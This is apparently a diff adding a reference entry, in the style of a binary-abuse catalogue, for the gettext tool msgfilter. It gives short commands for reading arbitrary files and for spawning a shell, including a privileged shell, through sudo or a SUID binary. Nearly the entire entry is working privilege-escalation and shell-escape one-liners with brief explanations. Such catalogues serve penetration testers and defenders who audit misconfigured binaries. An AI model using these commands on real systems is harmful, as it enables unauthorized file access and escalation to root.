@@ -1,0 +1,32 @@
+msgfilter
+=========
+
+File read
+---------
+
+[Sudo]
+    msgfilter -P -i /path/to/input-file /bin/cat
+    The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.
+
+[SUID]
+    msgfilter -P -i /path/to/input-file /bin/cat
+    The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.
+
+[Unprivileged]
+    msgfilter -P -i /path/to/input-file /bin/cat
+    The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.
+
+Shell
+-----
+
+[Sudo]
+    echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+    The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.
+
+[SUID]
+    echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
+    The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.
+
+[Unprivileged]
+    echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
+    The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.
